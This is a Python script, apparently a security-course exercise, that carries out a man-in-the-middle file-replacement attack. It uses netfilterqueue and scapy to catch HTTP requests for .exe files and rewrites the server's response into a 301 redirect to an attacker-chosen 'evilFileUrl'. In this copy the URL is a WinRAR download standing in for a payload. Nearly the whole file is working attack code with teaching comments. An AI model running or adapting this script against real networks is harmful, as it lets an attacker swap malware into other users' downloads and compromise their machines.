#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []
evilFileUrl = "https://www.rarlab.com/rar/wrar600.exe"


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # the below fields will be recalculated by scapy
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # get_payload() shows raw packet data
    # to be able to modify - convert raw packet which is unreadable into scapy packet in which we can see all layers

    if scapy_packet.haslayer(scapy.Raw):  # in scapy, data sent in Http layer is placed in Raw layer
        print(scapy_packet.show())
        # if dport(destination port) is http, then packet is a request
        # if sport(source port) is http, then packet is a response
        # rather than modifying request (for which we'd have to manually initiate a TCP handshake)
        # we would modify the response (for which handshake has already been established).
        # 'ack' in request is same as 'seq' in response
        if scapy_packet[
            scapy.TCP].dport == 10000:  # changed from 80 to 10000 as we have iptables rule redirecting packets
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load and evilFileUrl not in scapy_packet[scapy.Raw].load:
                print("EXE Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
            # print scapy_packet.show()

        elif scapy_packet[
            scapy.TCP].sport == 10000:  # changed from 80 to 10000 as we have iptables rule redirecting packets
            print("HTTP Request")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('Replacing files')
                # redirect the client
                # 301 Moved Permanently - This and all future requests should be directed to the given URI.
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 301 Moved Permanently\nLocation: " + evilFileUrl + "\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()  # accept the packet to forward it to destination else it is remains in queue forever
    # packet.drop()  # drop the packet, net connection can be cut this way as packets don't reach destination


queue = netfilterqueue.NetfilterQueue()
# create a netfilterqueue instance
queue.bind(0, process_packet)
# bind this queue to the queue (0) we created using the shell command
# process_packet is a callback executed on each packet in this queue
queue.run()
# run the queue else it will not run
